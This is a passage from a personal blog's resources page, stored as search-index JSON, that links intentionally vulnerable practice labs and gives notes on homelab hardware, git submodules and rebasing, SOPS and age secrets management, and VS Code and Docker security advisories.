Persistence</li> </ul> GOAD (Game of Active Directory) <p>The purpose of this tool is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques. The idea behind this project is to give you an environment where you can try and train your pentest skills without having the pain to build all by yourself. This repository was build for pentest practice.</p> <p>Effectively, this can spin up really fast (as quick as a couple hours) on a Kali Linux host running VirtualBox as the Hypervisor. There's also a Proxmox option, but for this you may want to look at Ludus below.</p> <p>It goes without saying you need a fair amount of resources to run this, and it will be extremely expensive in the cloud.</p> <ul> <li>https://github.com/Orange-Cyberdefense/GOAD</li> <li>https://orange-cyberdefense.github.io/GOAD/</li> </ul> Ludus <p>This was initially discovered on Paul's Security Weekly #861. It appears to be built on top of Proxmox and Game of AD, with a number of other options and features for a completely automated home lab experience.</p> <p>Ludus is a system to build easy-to-use cyber environments, or \"ranges\" for testing and development.</p> <p>Built on Proxmox, Ludus enables advanced automation while still allowing easy manual modifications or setup of virtual machines and networks.</p> <ul> <li>https://gitlab.com/badsectorlabs/ludus</li> </ul> Nuclei-Templates-Labs <p>A comprehensive collection of vulnerable environments paired with ready-to-use Nuclei templates for practical security testing and learning!</p> <ul> <li>https://github.com/projectdiscovery/nuclei-templates-labs</li> </ul> SamuraiWTF (Web Training Framework) <p>This version of the project is expirimental only for now.</p> <ul> <li>https://github.com/secureideas/samuraiwtf</li> </ul> VulnServer <p>An intentionally vulnerable listening process, meant to demonstrate buffer overflows.</p> <p>This project is referenced in many buffer overflow practice courses. The source code is short enough to read over in a few minutes and can be compiled fairly easily, meaning you can make changes and attempt to patch the code to remove the vulnerability too.</p> <ul> <li>https://github.com/stephenbradshaw/vulnserver</li> </ul> OWASP Juice Shop <p>OWASP Juice Shop is probably the most modern and sophisticated insecure web application! It can be used in security trainings, awareness demos, CTFs and as a guinea pig for security tools! Juice Shop encompasses vulnerabilities from the entire OWASP Top Ten along with many other security flaws found in real-world applications!</p> <ul> <li>https://github.com/juice-shop</li> <li>https://github.com/bkimminich/juice-shop#docker-container</li> <li>https://github.com/juice-shop/pwning-juice-shop</li> </ul> VulHub <p>Dockerized Vulnerable Software. These should be run in an isolated environment, such as a VM you would use for malware analysis.</p> <ul> <li>https://github.com/vulhub/vulhub</li> </ul> Snyk Goof <p>A vulnerable Node.js demo application.</p> <ul> <li>https://github.com/snyk-labs/nodejs-goof</li> </ul>"},{"location":"blog/2019/07/15/-resources/#hardware","title":"Hardware","text":"geerlingguy/mini-rack <p>Miniature rack builds, for portable or compact Homelabs.</p> <ul> <li>https://github.com/geerlingguy/mini-rack</li> </ul> Framework Desktop (AMD Ryzen AI Max) <p>frame.work/desktop</p> <p>This appears to be a relatively affordable and compact option for gaming, self-hosted AI workloads, and more. The raw compute power and size makes it a good candidate for a homelab server.</p> <p>Proxmox is not officially supported, but there are early reports of PVE 9.0+ working with the 6.17 kernel. Framework suggests kernel 6.15 or newer. This needs to be tested.</p> <ul> <li>frame.work: Official Distro Support</li> <li>Proxmox Forum: AMD Ryzen AI Max+ 395 / Radeon 8060S Support</li> </ul> Raspberry Pi <p>Secure Boot Chain of Trust</p> <ul> <li>Raspberry Pi4 Boot Process</li> <li>Raspberry Pi5 Boot Security</li> <li>Raspberry Pi boot EEPROM</li> <li>EEPROM boot flow</li> <li>BCM Chip Overviews and Datasheets</li> <li>OTP register and bit definitions</li> <li>github.com/raspberrypi/firmware/issues/1857 Support loading custom ARM firmware from EEPROM</li> </ul> <p>The first two references above detail the entire boot process for the most recent Raspberry Pi hardware models (4 and 5 at the time of writing this note). Separately from how Secure Boot works here, these documents help answer questions regarding the level of persistence an adversary could potentially reach on a Raspberry Pi, if for example a device is compromised.</p> <p>In the case of the Pi5, \"the BOOTROM always verifies the RPi signature and RPi <code>fw_min_ver</code> which is defined by the RPi per ROM key\". It's also evident from the open issue (#1857) that loading custom firmware from the EEPROM isn't possible yet. Couple that with the BOOTROM and OTP registers containing some factory-programmed data that's not writable, suggests that only properly signed firmware updates can be applied.</p> <p>Data sheets or supporting documentation that speaks to this more directly will be quoted or added here over time.</p>"},{"location":"blog/2019/07/15/-resources/#devops","title":"DevOps","text":"<p>Open Source Licensing</p> <p>If you need to choose a license, or learn more about one, these are the best resources to start with:</p> <ul> <li>choosealicense.com (created by GitHub)</li> <li>GitHub Docs: Licensing a Repo</li> <li>Open Source Guide: Choosing a License (recommended by GitHub)</li> <li>SPDX License ID List (found via licensee)</li> <li>Open Community and Resource Hub for Open Source Managers and OSPO Practitioners (found via licensee)</li> </ul> <p>licensee</p> <p>GitHub uses licensee to detect a repo license. This page details what licensee looks at to determine the repo license.</p> <p>SPDX License Identifiers</p> <p>The SPDX license guidance is the easiest way to note what license(s) each file falls under in your project.</p> <p>In each file in your project, just add a single line in the following format, tailored to your license(s) and the comment style for that file's language:</p> <ul> <li><code>// SPDX-License-Identifier: MIT</code></li> <li><code>/* SPDX-License-Identifier: MIT OR Apache-2.0 */</code></li> <li><code># SPDX-License-Identifier: GPL-2.0-or-later</code></li> </ul> <p>Securing GitOps</p> <p>VSCode Restricted Mode</p> <p>To define exactly what extensions can be installed and set restricted mode globally in <code>settings.json</code>:</p> <pre><code>{\n    \"extensions.allowed\": {},\n    \"security.workspace.trust.emptyWindow\": false\n}\n</code></pre> <p>Restricted Mode tries to prevent automatic code execution by disabling or limiting the operation of several VS Code features: tasks, debugging, workspace settings, and extensions.</p> <p>To see the full list of features disabled in Restricted Mode, you can open the Workspace Trust editor via the Manage link in the banner, or by selecting the Restricted Mode badge in the Status Bar.</p> <p>Important: Workspace Trust can't prevent a malicious extension from executing code and ignoring Restricted Mode. You should only install and run extensions that come from a well-known publisher that you trust.</p> <p>Tasks are defined in the workspace <code>.vscode</code> folder. This folder is cloned when git cloning a remote project.</p> <p>Git Hooks and Customizing Git Hooks</p> <p>Git hooks are scripts stored under <code>$GIT_DIR/hooks/*</code> or <code>git config core.hooksPath/*</code> in a project. The default/bundled example scripts all end with <code>.sample</code> and won't execute without a proper file extension. Git hooks can execute bash, Perl, Python, or really any scripting language.</p> <p>Git hooks do not get cloned when you clone or otherwise fetch the upstream source of a project. You will need to add these yourself similar to local git config settings.</p> shields.io Badges <p>Shields.io is a service for concise, consistent, and legible badges, which can easily be included in GitHub readmes or any other web page. The service supports dozens of continuous integration services, package registries, distributions, app stores, social networks, code coverage services, and code analysis services. It is used by some of the world's most popular open-source projects.</p> <ul> <li>https://shields.io/</li> <li>https://github.com/badges/shields</li> </ul> debos <p>debos is a tool to make the creation of various Debian-based OS images simpler. While most other tools focus on specific use-cases, debos is designed to be a toolchain making common actions trivial while providing enough rope to do whatever tweaking which might be required behind the scenes.</p> <p>debos expects a YAML file as input and runs the actions listed in the file sequentially. These actions should be self-contained and independent of each other.</p> <p>Discovered in the Kali Linux build-scripts repo for kali-vm.</p> <ul> <li>https://github.com/go-debos/debos</li> </ul> pulumi <p>Pulumi Infrastructure as Code is the easiest way to build and deploy infrastructure, of any architecture and on any cloud, using programming languages that you already know and love. Code and ship infrastructure faster with your favorite languages and tools, and embed IaC anywhere with Automation API.</p> <p>Simply write code in your favorite language and Pulumi automatically provisions and manages your resources on AWS, Azure, Google Cloud Platform, Kubernetes, and 120+ providers using an infrastructure-as-code approach. Skip the YAML, and use standard language features like loops, functions, classes, and package management that you already know and love.</p> <p>Suggested by yroc92 for infrastructure-as-code workflows.</p> <ul> <li>https://github.com/pulumi/pulumi</li> <li>https://www.pulumi.com/docs/</li> </ul> Answer Files (Unattend.xml) <p>Answer files (or Unattend files) can be used to modify Windows settings in your images during Setup. You can also create settings that trigger scripts in your images that run after the first user creates their account and picks their default language.</p> <p>Windows Setup will automatically search for answer files in certain locations, or you can specify an unattend file to use by using the <code>/unattend:&lt;file.xml&gt;</code> option when running Windows Setup (setup.exe).</p> <ul> <li>Microsoft: Automate Windows Setup</li> </ul> <p>This is a series of useful resources for automated or unattended Windows provisioning.</p> <ul> <li>https://github.com/StefanScherer/packer-windows</li> <li>https://github.com/rgl/windows-vagrant</li> <li>https://schneegans.de/windows/unattend-generator/</li> <li>https://github.com/cschneegans/unattend-generator/</li> <li>Microsoft: Create your own Answer file</li> <li>Microsoft: Unattended Windows Setup Reference</li> <li>Microsoft: Answer File Search Order</li> <li>Microsoft: setup.exe /unattend</li> <li>Microsoft: Disk Configuration XML<ul> <li>Microsoft: How to Configure UEFI/GPT-based Disks (Manually)</li> <li>Microsoft: How to Configure UEFI/GPT-based Disks (Autounattend.xml)</li> <li>Microsoft: How to Configure BIOS/MBR-based Disks</li> </ul> </li> </ul> Windows unattend.xml Generator <p>This is both a .NET library and website that can be used to generate customized <code>unattend.xml</code> files to provision Windows machines. Playing around with the settings is a great way to see how these files can be built, especially if you compare them to the files found in StefanScherer/packer-windows.</p> <p>Suggested by rpinz as a way to pick up Windows automation faster.</p> <ul> <li>https://github.com/cschneegans/unattend-generator</li> <li>https://schneegans.de/windows/unattend-generator/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#git","title":"Git","text":"<p>Pro Git (PDF/epub)</p> <p>The entire Pro Git book, written by Scott Chacon and Ben Straub and published by Apress, is available here. All content is licensed under the Creative Commons Attribution Non Commercial Share Alike 3.0 license. Print versions of the book are available on Amazon.com.</p> <p>Pulling the PDF or epub to search through all the examples at once will save you time.</p> <ul> <li>git-scm.com/book/en/v2</li> <li>github.com/progit/progit2</li> </ul> .gitignore <p>Often, you'll have a class of files that you don't want Git to automatically add or even show you as being untracked. These are generally automatically generated files such as log files or files produced by your build system. In such cases, you can create a file listing patterns to match them named <code>.gitignore</code>.</p> <p>This repo has <code>.gitignore</code> templates for numerous languages and projects.</p> <ul> <li>https://github.com/github/gitignore</li> </ul> <p>Take from the README of GitHub's gitignore repo:</p> <ul> <li>The Ignoring Files chapter of the Pro Git book.</li> <li>The Ignoring Files article on the GitHub Help site.</li> <li>The gitignore(5) manual page.</li> </ul> Git <code>--amend</code> to Rewrite History <p>You can change previous commits, if for example you made a mistake or typo and have not yet pushed them.</p> <p>Pro Git: Git Tools - Rewriting History</p> <pre><code># Make changes, staged those changes, then revise the last commit\ngit commit --amend\n\n# Simply sign the last commit if you forgot to\ngit commit -S --amend --no-edit\n</code></pre> <p>...amending changes the SHA-1 of the commit. It's like a very small rebase - don't amend your last commit if you've already pushed it.</p> Git Rebasing <p>In Git, there are two main ways to integrate changes from one branch into another: the <code>merge</code> and the <code>rebase</code>... With the rebase command, you can take all the changes that were committed on one branch and replay them on a different branch... There is no difference in the end product of the integration, but rebasing makes for a cleaner history. If you examine the log of a rebased branch, it looks like a linear history: it appears that all the work happened in series, even when it originally happened in parallel.</p> <p>In other words, it's cleaner to rebase changes below yours when working with other contributors on the same project.</p> <ul> <li>GitHub Docs: About <code>git-rebase</code></li> <li>GitHub Docs: Rebase and Merge Your Commits</li> <li>Pro Git: Git Branching - Rebasing</li> <li>Github Docs: Pushing Rebased Code to GitHub</li> </ul> <p>When does this happen? Imagine you have a branch with an open PR on an upstream project. If other PR's are being integrated ahead of yours, and collide with any changes you've made in your PR, you'll have a merge conflict. This is an example of that I encountered: https://github.com/geerlingguy/ansible-role-docker/pull/473</p> <p>So how do you fix it? Using <code>git rebase</code>, git rewinds then integrates the new upstream changes commited underneath your work, then replays your edits on top of them. If there are conflicts at this point you must intervene and resolve them with a code editor (<code>vi</code>, <code>nano</code>, <code>code</code>)</p> <pre><code># Checkout your branch\ngit checkout your-branch\n\n# Rebase while signing these changes\ngit rebase -S main\n</code></pre> <p>Here's where you'll need to resolve any conflicts from the rebase. <code>git</code> will walk you through this and show you what commands to run to proceed. Once completed you can sign your commit (if you weren't already prompted) and safely push it to your branch with <code>--force-with-lease</code>:</p> <pre><code># Sign the commit\ngit commit -S -m \"Your comment\"\n\n# Safely force push using the 'with lease' option\ngit push origin you-branch --force-with-lease\n</code></pre> <p>Safely Pushing: <code>--force-with-lease</code></p> <p>The manpage states:</p> <p><code>--force-with-lease</code> alone, without specifying the details, will protect all remote refs that are going to be updated by requiring their current value to be the same as the remote-tracking branch we have for them.</p> <p>(SNIP)</p> <p>This option allows you to say that you expect the history you are updating is what you rebased and want to replace. If the remote ref still points at the commit you specified, you can be sure that no other people did anything to the ref. It is like taking a \"lease\" on the ref without explicitly locking it, and the remote ref is updated only if the \"lease\" is still valid.</p> <p>In other words:</p> <p>The protection it offers over <code>--force</code> is ensuring that subsequent changes your work wasn't based on aren't clobbered...</p> <p>Reading further you'll see that <code>--force-with-lease=&lt;refname&gt;:&lt;expect&gt;</code> is the best method to do this, being the most specific. However in many cases simply using <code>--force-with-lease</code> seems to be fine.</p> Git Signatures <p>TO DO</p> Git Submodules <p>Submodules allow you to integrate a separate project into another using git. The project included as a submodule becomes version pinned to the commit at the point-in-time it was integrated. It's effectively a nested git repo within what becomes your \"superproject\", and can be pulled + updated to stay in sync with the submodule's repo. This is easy to do and helps you avoid duplicating work by reusing existing code.</p> <ul> <li>https://git-scm.com/book/en/v2/Git-Tools-Submodules</li> </ul> <p>To add a submodule to a repo:</p> <pre><code># &lt;submodule-name&gt; can be specified as an option, if you want to change it\n# Otherwise the repo name is used by default\ngit submodule add -b &lt;branch&gt; &lt;repo-url&gt; [&lt;submodule-name&gt;]\n</code></pre> <p>This creates the following <code>.gitmodules</code> file in the root of your repo:</p> <pre><code>[submodule \"&lt;submodule-name&gt;\"]\n    path = &lt;submodule-name&gt;\n    url = &lt;repo-url&gt;\n    branch = &lt;branch&gt;\n</code></pre> <p>You can manually edit and revise these files.</p> <p>Working on Submodules</p> <p>There is a <code>foreach</code> submodule command to run some arbitrary command in each submodule. This can be really helpful if you have a number of submodules in the same project.</p> <pre><code># Example running 'git pull' on all submodules in a repo\ngit submodule foreach 'git pull'\n</code></pre> <p>However, this does not work well with nested submodules. Comparing this post on stackoverflow with the manpage helps delineate your options.</p> <p>In most cases, when cloning for the first time, or updating a project with one or more submodules, you'll want to use:</p> <pre><code># Reinitialize all submodules, you'd do this after cloning a project with submodules\ngit submodule update --init --checkout [--recursive]\ngit submodule sync [--recursive]\n\n# If a branch isn't already specified in .gitmodules, you can set it\ngit submodule set-branch --branch &lt;branch&gt; ./path/to/submodule\n\n# Check status of all submodules, including nested projects\ngit submodule foreach [--recursive] 'git submodule status [--recursive]'\n\n# Fetch any missing commits and update the working directory of all submodules\ngit submodule foreach [--recursive] '\n    git submodule update --init [--checkout] [--recursive]\n    git submodule update --remote [--checkout] [--recursive]\n'\n</code></pre> <p>The steps above effectively initialize your current project with the latest changes of all submodules.</p> <p><code>--checkout</code> is optional, you can leave the submodule empty with only a reference to the commit.</p> <p><code>--recursive</code> is also optional, to recurse into nested submodules. You don't always need this.</p> <p>When updating a (super)project's submodules to point to the latest changes:</p> <pre><code># --remote will pull in the latest changes of submodules\ngit submodule update --remote [--recursive]\n</code></pre> <p>Deinitializing Submodules</p> <p>If you accidentally cloned a super-project and all of its submodules recursively, you can deinitialize them to undo this. This doesn't actually affect your commit status, even if you just added changes from a submodule to be commited, because it's all tracked by commit hashes over the files themselves.</p> <pre><code># -f | --force will remove even submodules with local modifications\ngit submodule deinit -f my_submodule/\n\n# --all will unregister all submodules within the super-project\ngit submodule deinit -f --all\n</code></pre> <p>Cloning Submodules Unauthenticated</p> <p>The safest way will always be over SSH by verifying the remote server's public key. However, if you simply want to clone a project unauthenticated in a test environment without an SSH key that is tied to your GitHub account, you can convert the endpoints to HTTPS. (The goal here is to avoid the <code>--global</code> option. GPT5 pointed to these references and provided a number of examples to try locally to work around this.)</p> <ul> <li>Git-Scm: <code>url.&lt;base&gt;.insteadOf</code></li> <li>Git-Scm: git <code>-c</code> Option</li> <li>Git Submodules Equivalent of <code>url.insteadOf</code></li> </ul> <p>This first example is required to (easily) initialize all submodules over HTTPS:</p> <pre><code>git clone \"${git_repo}\"\ncd \"${git_repo##*/}\"\ngit -c url.https://github.com/.insteadof=ssh://git@github.com/ \\\n    -c url.https://github.com/.insteadof=git@github.com: \\\n    submodule update --init --checkout --recursive\n</code></pre> <p>This second example sets this change at the local project configuration level per-submodule going forward, now that each submodule has been initialized, since the previous change is not persistant and is used to quickly \"init\" all submodules:</p> <pre><code># Set the change for each submodule at the project level after initializing\ngit submodule foreach --recursive \\\n    'git config url.https://github.com/.insteadof ssh://git@github.com/\n    git config url.https://github.com/.insteadof git@github.com:'\n\n# Confirm HTTPS is in use\ngit submodule foreach --recursive 'git fetch -v'\n</code></pre> <p>This will recursively checkout all submodules of a project, changing the SSH url to HTTPS.</p> <p>Using Tags in Submodules</p> <p>Submodules are \"pinned\" to a branch (technically a commit hash). This makes working with tags both less clear, but equally straight forward depending on what you want to do.</p> <ul> <li>git-scm.com: Working with Remotes</li> <li>git-scm.com: Tagging</li> </ul> <p>This section will use a real example that's public. I worked through this by cross referencing examples Google and ChatGPT returned with what's covered in the Git documentation. The goal was to maintain a fork of the wazuh-ansible repo, that I will point to the latest release tag as a submodule in my ansible-configs repo.</p> <p>The wazuh-ansible releases are based on tags, not branches. Submodules prefer using branches to track commits, not tags. In this case it makes sense to checkout the tag in my fork as a dedicated branch (something like <code>&lt;username&gt;/latest-tag</code>) that the submodule will always point to. In other words, whenever a new tag is released, you're adding that commit data to the same <code>&lt;username&gt;/latest-tag</code> branch the submodule will track. You could also create branches for each tag if that makes more sense, but the submodule will need to be updated to track that branch.</p> <pre><code># Clone your fork\ngit clone git@github.com:straysheep-dev/wazuh-ansible.git\n\n# Add the upstream source as a remote\ngit remote add upstream git@github.com:wazuh/wazuh-ansible.git\n\n# Fetch the latest stable release tag (you'll repeat this to update to the latest tag)\n# As of the time of writing that's v4.14.0\ngit fetch upstream tag v4.14.0\n\n# Push that tag to your fork (it seems to become aware of all tags at this point)\ngit push origin v4.14.0\n</code></pre> <p>Create a branch that you'll use to track the latest release tag. This stays the same, and allows you to pull in future tags without needing to change which branch the submodule tracks.</p> <pre><code># Checkout the tag, and simultaneously create the branch you want to use to track the latest tag commit\ngit checkout -b &lt;branch&gt; &lt;tag&gt;\ngit checkout -b straysheep-dev/latest-tag v4.14.0\n</code></pre> <p>Now add the submodule, pointing it to your branch that will track the latest tag release going forward (<code>straysheep-dev/latest-tag</code>):</p> <pre><code># Add your fork + custom branch as a submodule\ngit submodule add -b &lt;branch&gt; &lt;url&gt; &lt;local-path&gt;\ngit submodule add -b straysheep-dev/latest-tag git@github.com:straysheep-dev/wazuh-ansible.git install_wazuh\n</code></pre> <p>Now any time you need to update that branch to a later tag as new tags are released, you're pulling any new tag data into that same <code>&lt;username&gt;/latest-tag</code> branch.</p> <p>Security Advisories</p> CVE-2025-48384 <p>When reading a config value, Git strips any trailing carriage return and line feed (CRLF). When writing a config entry, values with a trailing CR are not quoted, causing the CR to be lost when the config is later read. When initializing a submodule, if the submodule path contains a trailing CR, the altered path is read resulting in the submodule being checked out to an incorrect location. If a symlink exists that points the altered path to the submodule hooks directory, and the submodule contains an executable post-checkout hook, the script may be unintentionally executed after checkout. This vulnerability is fixed in v2.43.7, v2.44.4, v2.45.4, v2.46.4, v2.47.3, v2.48.2, v2.49.1, and v2.50.1.</p> <ul> <li>https://nvd.nist.gov/vuln/detail/CVE-2025-48384</li> <li>https://github.com/git/git/security/advisories/GHSA-vwqx-4fm8-6qc9</li> </ul>"},{"location":"blog/2019/07/15/-resources/#cicd","title":"CI/CD","text":"<p>Continuous Integration, Continuous Deployment</p> <p>These concepts have their own dedicated posts with ready-to-use examples.</p> <ul> <li>CI/CD</li> <li>Linting Code</li> </ul>"},{"location":"blog/2019/07/15/-resources/#sops","title":"SOPS","text":"<p>SOPS</p> <p>SOPS is an editor of encrypted files that supports YAML, JSON, ENV, INI and BINARY formats and encrypts with AWS KMS, GCP KMS, Azure Key Vault, age, and PGP.</p> <ul> <li>https://github.com/getsops/sops</li> </ul> Verifying Integrity <p>SOPS has an extensive series of checks you can do to validate the release files are authentic and haven't been tampered with. An SBOM is also provided with each release.</p> Ansible Collection <p>SOPS is available by default as a community collection in the standard Ansible package. Review Protecting Ansible Secrets with SOPS for a quick-start guide.</p> <p>SOPS is better suited for complex environments over an Ansible Vault file because it can encrypt comments and values in files while leaving the mapping keys visible within structured data like YAML, JSON, INI and ENV.</p> <p>If you have Ansible already installed on a controller or node, you can easily install SOPS from your package manager or GitHub using the built-in role via the two convenience playbooks (below).</p> <pre><code># Install SOPS on Ansible controller\n$ ansible-playbook community.sops.install_localhost\n\n# Install SOPS on remote servers\n$ ansible-playbook community.sops.install --inventory /path/to/inventory\n</code></pre> <p>It's recommended to use <code>age</code> with SOPS for encryption.</p> <p>Example Usage</p> <p>Example workflow to convert an existing inventory.yaml file to an age-encrypted file via SOPS:</p> <pre><code># SOPS uses predictable config folder paths, create one on Linux\nmkdir -p $HOME/.config/sops/age/\n\n# Generate an age public / private key pair\nage-keygen -o $HOME/.config/sops/age/keys.txt\n\n# Create a SOPS copy of an existing inventory file\nsops encrypt --age &lt;public-key-string&gt; inventory.yaml &gt; inventory.enc.yaml\n\n# Assuming your inventory previously referenced an Ansible vault with variables,\n# you can now write those secrets into the inventory.enc.yaml file that's\n# protected with SOPS and age\nsops inventory.enc.yaml\n\n# You can also use a text editor to write key mappings into an encrypted SOPS file!\nnano inventory.enc.yaml\n# Then add the secrets later with SOPS\nsops inventory.enc.yaml\n</code></pre> Best Practices <p>The documented usage covers (what I read as) three layers:</p> <ul> <li>setting the environment variable <code>SOPS_AGE_KEY_FILE</code>;</li> <li>setting the <code>SOPS_AGE_KEY</code> environment variable;</li> <li>providing a command to output the age keys by setting the <code>SOPS_AGE_KEY_CMD</code> environment variable.</li> </ul> <p>SOPS automatically reads from <code>~/.config/sops/age/keys.txt</code>. This seems to be fine to get started with on trusted / locked down machines for devops or automated workflows. The next step up from that would be using a granularly-scoped vault to retrieve the <code>age</code> secret dynamically via the <code>SOPS_AGE_KEY_CMD</code> environment variable. Keys in this scenario can be rotated too without needing to rotate all of the encrypted secrets. Neither of these methods prevent a root process on that host from compromising the key or it's secrets at the moment of decryption, in which case, all secrets should be rotated. However, it greatly limits (and through a vault, audits) the potential reach of the damage through what are effectively layers of abstraction.</p> <p>The ideal (Ansible) setup seems to be a dedicated, locked down host (the controller node), storing the secrets and/or with vault access, to launch automated workflows on other machines remotely. The machines with the highest chance to be compromised only ever contain their own secrets in memory temporarily and have no access to the controller node or other secrets. This is similar to what cloud provider's key management services do, where specific secrets are provided just-in-time.</p> <p>This is discussed in more detail here: https://getsops.io/docs/#the-initial-trust</p>"},{"location":"blog/2019/07/15/-resources/#age","title":"age","text":"<p>age</p> <p>A simple, modern and secure encryption tool (and Go library) with small explicit keys, no config options, and UNIX-style composability.</p> <ul> <li>https://github.com/FiloSottile/age</li> </ul> <p>See the GitHub README for an overview and quick-start on usage. This is the recommended encryption tool to use with SOPS instead of GPG.</p>"},{"location":"blog/2019/07/15/-resources/#github","title":"GitHub","text":"<p>Platform Information</p> <ul> <li>GitHub's SSH Key Fingerprints</li> <li>GitHub's Public GPG Key: 9684 79A1 AFF9 27E3 7D1A 566B B569 0EEE BB95 2194</li> </ul>  gh cli <p><code>gh</code> is GitHub on the command line. It brings pull requests, issues, and other GitHub concepts to the terminal next to where you are already working with git and your code.</p> <ul> <li>https://github.com/cli/cli</li> <li>GPG Key File:<ul> <li>0x23F3D4EA75716059</li> <li>https://cli.github.com/packages/githubcli-archive-keyring.gpg</li> </ul> </li> </ul> <pre><code>pub   rsa4096/0x23F3D4EA75716059 2022-09-06 [SC] [expires: 2026-09-05]\n    Key fingerprint = 2C61 0620 1985 B60E 6C7A  C873 23F3 D4EA 7571 6059\nuid                             GitHub CLI &lt;opensource+cli@github.com&gt;\nsub   rsa4096/0xE5FAF19590714157 2022-09-06 [E] [expires: 2026-09-05]\n</code></pre>  GitHub-hosted runners <p>GitHub offers hosted virtual machines to run workflows. The virtual machine contains an environment of tools, packages, and settings available for GitHub Actions to use.</p> <p>Docker is one of the tools that is preinstalled on GitHub's hosted runners. The runner-images repo linked below details all software available to each runner image.</p> <ul> <li>GitHub: GitHub Hosted Runners</li> <li>GitHub: Runner Images &amp; Preinstalled Software</li> <li>GitHub: Configure Working Path and Shell for CI</li> <li>github.com/actions/checkout</li> <li>github.com/actions/setup-python</li> <li>github.com/actions/setup-go</li> <li>github.com/actions/setup-node</li> </ul> GitHub README Customization <p>Custom Stat Cards</p> <ul> <li>How can I add GitHub stats to my profile?</li> <li>GitHub README Stats</li> </ul>"},{"location":"blog/2019/07/15/-resources/#vscode","title":"VSCode","text":"<p>VSCode</p> <p>The open source AI code editor.</p> <ul> <li>https://github.com/microsoft/vscode</li> <li>https://code.visualstudio.com/</li> </ul> <p>Possibly the most popular code editor. It's lighter weight than Visual Studio, cross-platform, and still very feature rich with built-in support for git, visual diff similar to GitHub, and other dev(ops) operations. Use it as a frontend to connect to a remote developer server, integrate with various AI tools, and more.</p> <p>From a security perspective, the extensions marketplace and remote automation capabilities make it an interesting attack vector for secrets theft, malware deployment, and even direct C2 communications.</p> Settings JSON File <p>Settings JSON File</p> <ul> <li>Windows <code>%APPDATA%\\Code\\User\\settings.json</code></li> <li>macOS <code>$HOME/Library/Application\\ Support/Code/User/settings.json</code></li> <li>Linux <code>$HOME/.config/Code/User/settings.json</code></li> </ul> Search vs Find in Folder <p>It's often useful, if you have all of your projects under a <code>~/src</code> directory, to open that folder so all of your projects are accessible in the explorer pane.</p> <p>Search allows you to search through everything in the explorer pane, as well as conduct find-and-replace operations.</p> <p>Find in Folder can do the same, and is available by right-clicking any folder in the explorer pane to limit your search to just that path.</p>"},{"location":"blog/2019/07/15/-resources/#ansible","title":"Ansible","text":"<p>Ansible</p> <p>Most of my Ansible notes were a part of the README over at my straysheep-dev/ansible-configs repo. These have moved to their own post on this blog: straysheep.dev/blog/ansible.</p> <p>With that said, the most general and useful notes or links can be found here.</p> <ul> <li>Ansible GitHub</li> <li>Installing <code>ansible</code></li> <li>Installing <code>anisble-lint</code></li> <li><code>ansible-lint</code> Rules</li> </ul> Ansible-Galaxy <p>This is the suggested way to share and run roles or collections. Though you can run them using local paths, you're meant to reference them using a fully-qualified-name (FQN in Ansible terms).</p> <ul> <li>Ansible-Galaxy</li> <li>Ansible-Galaxy User Guide (<code>ansible-galaxy</code>)</li> <li>Ansible-Galaxy User Guide (Platform and API)</li> <li>Create Ansible Roles or Collections</li> <li>Role Naming Conventions</li> </ul> <p>When creating roles that will be published, you'll need to fill out the <code>meta.yml</code> details:</p> <ul> <li>Role Meta: Supported Platforms (GH Issue: 52)</li> <li>Role Meta: Supported Platforms (<code>ansible-lint</code> schema)</li> </ul> <p>The documentation (at the time of writing) suggested making an <code>~/.ansible.cfg</code> to target the beta galaxy_ng server, however this is no longer working (in other words, the galaxy_ng server is no longer in beta and is now the default). It seems the best way to do this is by providing your API key on the command line, through an environment variable:</p> <pre><code>echo \"Enter Galaxy API Token\"; read -r -s ansible_galaxy_token; export ANSIBLE_GALAXY_TOKEN=$ansible_galaxy_token\n# [type or paste your key, it won't echo or show up in your bash history]\nansible-galaxy role import -vvv --token $ANSIBLE_GALAXY_TOKEN &lt;github-username&gt; &lt;ansible-role-my_repo&gt;\n</code></pre> <p>The above command will add (import) a role from your GitHub, to your own Ansible-Galaxy namespace, so that others can download and install it directly from the <code>ansible-galaxy</code> command.</p> Molecule <p>Molecule aids in the development and testing of Ansible content: collections, playbooks and roles.</p> <p>Discovered by reviewing geerlingguy's ansible-role-docker ci.yml file.</p> <ul> <li>https://github.com/ansible/molecule</li> <li>https://ansible.readthedocs.io/projects/molecule/</li> </ul> Ansible for DevOps <p>This repository contains Ansible examples developed to support different sections of Ansible for DevOps, a book on Ansible by Jeff Geerling.</p> <p>Many examples use Vagrant, VirtualBox, and Ansible to boot and configure VMs on your local workstation.</p> <p>Not all playbooks follow all of Ansible's best practices, as they illustrate particular Ansible features in an instructive manner.</p> <ul> <li>https://github.com/geerlingguy/ansible-for-devops</li> </ul> deb822_repository Module <ul> <li>Add and remove deb822 formatted repositories</li> </ul> <p>This appears to be the newest module in core that replaces the deprecated apt_key module. You can read more about Debian third-party repository standards here.</p> pfsensible <p>Ansible modules for managing a pfSense firewall.</p> <ul> <li>https://github.com/pfsensible/core</li> </ul>"},{"location":"blog/2019/07/15/-resources/#docker","title":"Docker","text":"<p>Docker Hub</p> <p>Docker Hub simplifies development with the world's largest container registry for storing, managing, and sharing Docker images. By integrating seamlessly with your tools, it enhances productivity and ensures reliable deployment, distribution, and access to containerized applications. It also provides developers with pre-built images and assets to speed up development workflows.</p> <ul> <li>https://hub.docker.com/</li> <li>https://docs.docker.com/docker-hub/</li> <li>Official &amp; Verified Images</li> </ul> setup-docker-action <p>GitHub Action to set up (download and install) Docker CE. Works on Linux, macOS and Windows.</p> <p>This action is useful if you want to pin against a specific Docker version or set up a custom daemon configuration or if Docker is not available on your runner. If you're using GitHub-hosted runners on Linux or Windows, Docker is already up and running, so it might not be necessary to use this action.</p> <ul> <li>https://github.com/docker/setup-docker-action</li> </ul> Docker SDK for Python <p>A Python library for the Docker Engine API. It lets you do anything the docker command does, but from within Python apps - run containers, manage containers, manage Swarms, etc.</p> <ul> <li>https://github.com/docker/docker-py</li> <li>Ansible for Devops: Molecule Examples</li> </ul> <p>Security Advisories</p> CVE-2025-9074 <p>A vulnerability was identified in Docker Desktop that allows local running Linux containers to access the Docker Engine API via the configured Docker subnet, at 192.168.65.7:2375 by default. This vulnerability occurs with or without Enhanced Container Isolation (ECI) enabled, and with or without the \"Expose daemon on tcp://localhost:2375 without TLS\" option enabled. This can lead to execution of a wide range of privileged commands to the engine API, including controlling other containers, creating new ones, managing images etc. In some circumstances (e.g. Docker Desktop for Windows with WSL backend) it also allows mounting the host drive with the same privileges as the user running Docker Desktop.</p> <ul> <li>https://nvd.nist.gov/vuln/detail/CVE-2025-9074</li> 